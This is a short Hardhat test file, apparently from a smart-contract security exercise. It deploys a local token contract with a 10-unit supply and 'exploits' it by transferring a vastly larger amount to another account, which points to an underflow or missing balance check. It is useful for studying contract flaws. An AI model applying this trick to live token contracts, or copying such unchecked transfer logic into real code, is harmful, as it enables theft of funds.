/* eslint-disable */
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { Contract, ContractFactory } from "ethers";
import hre from "hardhat";

let ethers = hre.ethers;

describe("Exploit", function () {
  let owner: SignerWithAddress,
    addr1: SignerWithAddress,
    addr2: SignerWithAddress,
    addr3: SignerWithAddress,
    other: SignerWithAddress[];

  let Token: ContractFactory;
  let tokenContract: Contract;

  before(async function () {
    [owner, addr1, addr2, addr3, ...other] = await ethers.getSigners();

    Token = await ethers.getContractFactory("Token");
    tokenContract = await Token.deploy(ethers.utils.parseEther("10"));
    await tokenContract.deployed();
  });
  it("Check block number", async function () {
    const latestBlock = await hre.ethers.provider.getBlock("latest");
  });
  it("Exploit", async function () {
    await tokenContract.transfer(addr1.address, ethers.utils.parseEther("100000000000000000"));

    console.log(ethers.utils.formatEther(await tokenContract.balanceOf(addr1.address)));
  });
});
